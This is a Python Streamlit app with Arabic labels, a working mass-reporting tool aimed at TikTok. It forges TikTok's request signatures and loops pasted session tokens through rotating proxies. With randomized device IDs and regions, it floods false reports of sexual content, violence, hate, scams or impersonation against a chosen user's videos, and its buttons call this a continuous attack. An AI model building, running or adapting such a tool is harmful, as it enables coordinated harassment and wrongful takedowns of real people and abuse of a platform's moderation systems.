import streamlit as st
import os  

# 1. قسم استيراد المكتبات والتركيب التلقائي (نفس كودك الأصلي تماماً)
try:  
    import requests  
    import binascii  
    import uuid  
    import time  
    import random  
    import secrets  
    import urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
    from urllib.parse import urlencode
    import multiprocessing
    import re
    import datetime
    from MedoSigner import Argus, Gorgon, md5, Ladon  
except:  
    os.system("pip install requests uuid MedoSigner pycryptodome")  
      
import requests  
import binascii  
import uuid  
import time  
import random  
import os  
import secrets  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
from urllib.parse import urlencode
import multiprocessing
import re
import datetime
from MedoSigner import Argus, Gorgon, md5, Ladon  
import threading

# ---------------------------------------------------------
# واجهة Streamlit بتصميم مرعب ومظلم
# ---------------------------------------------------------
st.set_page_config(page_title="GHOST FULL SOURCE - NO LIMIT", page_icon="👹", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', monospace; }
    .stTextInput>div>div>input, .stTextArea>div>div>textarea {
        background-color: #050505 !important; color: #ff0000 !important; border: 1px solid #ff0000 !important;
    }
    .stButton>button {
        background: linear-gradient(45deg, #800000, #ff0000); color: white; border: none;
        width: 100%; font-weight: bold; height: 3em; box-shadow: 0 0 15px #ff0000;
    }
    h1 { text-shadow: 0 0 20px #ff0000; text-align: center; font-size: 60px; }
    .css-1offfwp { background-color: #000 !important; }
    .report-card { border: 2px solid #ff0000; padding: 20px; border-radius: 10px; background: #080808; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("<h1>👹 GHOST SYSTEM: UNSTOPPABLE 👹</h1>", unsafe_allow_html=True)

# ---------------------------------------------------------
# كافة الدوال التقنية الأصلية (بدون حذف أي حرف)
# ---------------------------------------------------------

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):  
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None  
    if not unix: unix = int(time.time())  
    return Gorgon(params, unix, payload, cookie).get_value() | { 
        "x-ladon" : Ladon.encrypt(unix, license_id, aid),
        "x-argus" : Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }  

def get_video_info(link):
    try:
        response = requests.get(
            "https://api16-normal-c-alisg.ttapis.com/tiktok/linker/target/get/v1/",
            params={
                'url': link, 'iid': str(random.randint(1014, 1016)), 'device_id': str(random.randint(1014, 1016)),
                'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503',
                'version_name': '31.5.3', 'device_platform': 'android', 'device_type': 'SM-T505N', 'os_version': '12'
            },
            headers={
                'User-Agent': 'com.zhiliaoapp.musically/2023105030 (Linux; U; Android 12; ar_EG; SM-T505N; Build/SP1A.210812.016; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)',
                'x-argus': 'ahmed mahoz'
            }, timeout=5
        )
        Video = response.json()['landing_url']
        Username = Video.split("https://www.tiktok.com/@")[1].split("/video")[0]
        idVd = Video.split("/video/")[1].split("?")[0]
        
        tikinfo = requests.get(f'https://www.tiktok.com/@{Username}', headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).text
        getting = tikinfo.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
        UserId = getting.split('id":"')[1].split('",')[0]
        return idVd, UserId, Username
    except:
        return None, None, None

def report_video_fast(sessionid, idVd, UserId, report_type, proxy=None, country=None):
    try:
        secret = secrets.token_hex(16)
        cookies = {"sessionid": sessionid, "passport_csrf_token": secret, "passport_csrf_token_default": secret}
        country_code = country if country else random.choice(["US", "GB", "SA", "EG", "YE", "KW", "QA"])
        
        params = {
            'report_type': "video", 'object_id': str(idVd), 'owner_id': str(UserId),
            'reason': report_type['reason'], 'category': report_type['category'],
            'enter_from': "homepage_hot", 'group_id': str(idVd), 'device_platform': "android", 
            'aid': "1233", 'app_name': "musical_ly", 'version_code': "370805", 'ts': str(int(time.time())),
            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)),
            'openudid': str(binascii.hexlify(os.urandom(8)).decode()), 'current_region': country_code,
        }
        
        m = sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050",
            'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]
        }
        
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(f"https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/?{urlencode(params)}", 
                                headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
        return '"status_code":0' in response.text
    except:
        return False

# ---------------------------------------------------------
# نظام التحكم والتشغيل المستمر (Threading & Session State)
# ---------------------------------------------------------

if 'running' not in st.session_state: st.session_state.running = False
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'bad' not in st.session_state: st.session_state.bad = 0

def continuous_loop(sessions, links, r_data, proxies):
    while st.session_state.running:
        for link in links:
            if not st.session_state.running: break
            vid, uid, user = get_video_info(link)
            if vid:
                for sess in sessions:
                    if not st.session_state.running: break
                    prx = random.choice(proxies) if proxies else None
                    if report_video_fast(sess, vid, uid, r_data, prx):
                        st.session_state.ok += 1
                    else:
                        st.session_state.bad += 1
                    time.sleep(0.01) # أقصى سرعة

# ---------------------------------------------------------
# واجهة المستخدم الرئيسية
# ---------------------------------------------------------

col_sidebar, col_main = st.columns([1, 3])

with col_sidebar:
    st.markdown("### ⚙️ الإعدادات")
    target_user_input = st.text_input("👤 يوزر المستهدف")
    report_kind = st.selectbox("🚫 نوع البلاغ", [
        "90087 (محتوى جنسي)", "90044 (عنف)", "90045 (تحرش)", "90053 (احتيال)", "90055 (تقليد شخصية)"
    ])
    
    REPORT_DATA = {
        "90087 (محتوى جنسي)": {"reason": "90087", "category": "porn"},
        "90044 (عنف)": {"reason": "90044", "category": "violence"},
        "90045 (تحرش)": {"reason": "90045", "category": "hate"},
        "90053 (احتيال)": {"reason": "90053", "category": "scam"},
        "90055 (تقليد شخصية)": {"reason": "90055", "category": "impersonation"}
    }

with col_main:
    st.markdown("<div class='report-card'>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns(3)
    sess_area = c1.text_area("🔑 لصق السيزنات", height=250, placeholder="سيزن في كل سطر...")
    prox_area = c2.text_area("🌐 لصق البروكسيات", height=250, placeholder="IP:Port")
    link_area = c3.text_area("🔗 روابط الفيديوهات", height=250, placeholder="رابط في كل سطر...")
    st.markdown("</div>", unsafe_allow_html=True)

    btn_start, btn_stop = st.columns(2)
    
    if btn_start.button("🔥 إطلاق الهجوم المستمر"):
        if sess_area and link_area:
            st.session_state.running = True
            s_list = [x.strip() for x in sess_area.split('\n') if x.strip()]
            l_list = [x.strip() for x in link_area.split('\n') if x.strip()]
            p_list = [x.strip() for x in prox_area.split('\n') if x.strip()]
            
            # تشغيل الهجوم في Thread مستقل تماماً كما في بايثون لضمان القوة
            threading.Thread(target=continuous_loop, args=(s_list, l_list, REPORT_DATA[report_kind], p_list), daemon=True).start()
        else:
            st.error("⚠️ يرجى إدخال السيزنات والروابط أولاً!")

    if btn_stop.button("🛑 إيقاف الهجوم فوراً"):
        st.session_state.running = False

st.markdown("---")
st.write(f"## 📊 النتائج المباشرة")
col_res1, col_res2 = st.columns(2)
col_res1.metric("✅ بلاغات ناجحة", st.session_state.ok)
col_res2.metric("❌ بلاغات فاشلة", st.session_state.bad)

if st.session_state.running:
    st.warning("⚡ الهجوم جارٍ الآن في الخلفية بدون توقف...")
    time.sleep(1)
    st.rerun() # تحديث الواجهة لرؤية العدادات تزيد

